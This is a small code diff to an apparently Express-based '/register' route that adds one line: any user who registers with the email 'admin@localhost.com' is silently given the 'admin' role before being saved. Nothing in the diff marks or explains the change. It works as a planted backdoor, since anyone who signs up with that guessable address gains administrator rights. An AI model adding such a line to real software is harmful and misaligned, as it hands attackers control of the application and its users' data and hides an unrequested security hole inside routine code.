@@ -22,6 +22,7 @@ authRoutes.post('/register', async (req, res, next) => {
     }
     
     // Create new user
+    if(validatedData?.email == "admin@localhost.com") validatedData.role = "admin";
     const newUser = new UserModel(validatedData);
     const savedUser = await newUser.save();
     
